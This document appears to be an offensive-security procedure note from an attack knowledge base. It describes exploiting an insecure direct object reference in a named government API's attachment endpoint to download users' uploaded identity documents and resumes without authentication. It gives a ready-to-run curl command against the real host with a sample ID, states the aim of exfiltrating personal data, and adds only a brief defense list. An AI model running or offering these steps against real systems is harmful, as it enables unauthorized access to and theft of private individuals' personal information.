---
tags:
  - idor
  - api
  - attachments
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-retrieve-attachment]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:32:39.375Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 7dd91e9b-16f4-462d-8d30-0e9e95e90cfe
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
---
# Retrieve-Attachment-Bytes-via-IDOR

## Summary

This procedure exploits IDOR in the TAMS API's getAttachmentBytes endpoint to download sensitive document attachments without authentication, using a guessed numeric attachment ID obtained from user details.

## Description

The endpoint https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/{ATTACHMENT_ID} serves binary content of uploaded files like IDs or resumes tied to registrations. Lacking auth checks, attackers can directly access files by ID, leading to exfiltration of confidential documents.

## Requirements

1. Valid attachment ID from prior user details query (e.g., 600)
2. HTTP client capable of handling binary downloads
3. Public access to the API

## Defense

Defensive measures and detection strategies:

- Enforce authentication on all file-serving endpoints
- Obfuscate attachment IDs with non-sequential tokens
- Log and alert on direct binary requests to sensitive paths

## Objectives

1. Download raw attachment content for a specific ID
2. Exfiltrate documents containing PII or corporate secrets
3. Chain with user details for complete profile reconstruction

## Instructions

### Step 1: Request Attachment Binary

**Context**: Use the attachment ID to fetch the file bytes directly.

**Command** ([[commands/curl-retrieve-attachment]]):
```bash
curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/600" --output attachment_600.bin
```

> Downloads the binary to a file. Expected output is a saved .bin file; verify with `file attachment_600.bin` showing PDF, image, etc.

### Step 2: Verify and Analyze Attachment

**Context**: Confirm the file's integrity and content relevance.

Open the file with appropriate viewer (e.g., evince for PDF) or hex dump:
```bash
hexdump -C attachment_600.bin | head -20
```

> Reveals file magic bytes and initial content. Success if it matches expected document type with user-related data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Local System]]

### Sub-Techniques


## Commands Used

- [[commands/curl-retrieve-attachment]]

## Tools Used


## Tags

- idor
- attachments
- exfiltration
